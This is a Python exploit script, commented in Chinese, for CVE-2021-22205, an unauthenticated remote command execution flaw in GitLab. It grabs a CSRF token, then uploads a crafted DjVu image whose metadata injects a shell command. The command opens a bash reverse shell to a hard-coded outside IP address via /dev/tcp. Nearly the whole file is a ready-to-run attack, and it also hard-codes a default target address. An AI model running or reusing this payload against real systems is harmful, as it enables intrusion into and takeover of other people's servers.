
import requests
from bs4 import BeautifulSoup

class Exploit():
    __info__={
        'name': 'CVE-2021-22205',
        'desription': 'gitlab 未授权远程命令执行',
        'references': ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205'],
        'devices': ['gitlab',
                    '11.9=< version <13.8.8',
                    '13.9=< version <13.9.6',
                    '13.10=< version <13.10.3'
        ],
    }

    target = "49.232.164.123"
    port = "8080"
    reverseShell = "echo '/bin/bash -i >& /dev/tcp/81.68.77.245/8001 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh"


    def exploit(self):
        session = requests.Session()
        requests.packages.urllib3.disable_warnings()
        url = "http://{}:{}".format(self.target,self.port)
        try:
            r = session.get(url.strip("/") + "/users/sign_in", verify=False)
            print(r.text)
            soup = BeautifulSoup(r.text,features="lxml")
            token = soup.findAll('meta')[16].get("content")
            #data 是payload
            data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{" + self.reverseShell + "} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
            #请求头
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                "Connection": "close",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
            flag = 'Failed to process image'
            req = session.post(url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False )
            x = req.text
            if flag in x:
                return "success!!!"
            else:
                print("[-] Vuln chek Failed ... ...")
                return 'failed'


        except Exception as error:
            print(error.with_traceback())
            print("[-] Vuln Check Failed... ...")
            return 'failed'



    def run(self):
        res = self.exploit()
        return res


if __name__ == '__main__':
    exploit = Exploit()
    '''
    在GitLab CE/EE中发现一个问题，从11.9开始影响所有版本。
    GitLab没有正确地验证传递给文件解析器的图像文件，导致远程命令执行
    此脚本利用此漏洞进行反弹shell, 测试前请配置好下面的 listenIp 和 listenPort 参数
    '''
    #下面是设置反弹shell的参数
    exploit.target = "xxx.xxx.xxx.xxx"
    exploit.port = "8080"
    
    #反弹shell 攻击机监听端口
    listenIP = "xxx.xxxx.xxx.xxx"
    listenPort = "8001"
    exploit.reverseShell = exploit.reverseShell.format(listenIP,listenPort)
    result = exploit.run()
    print(result)
    
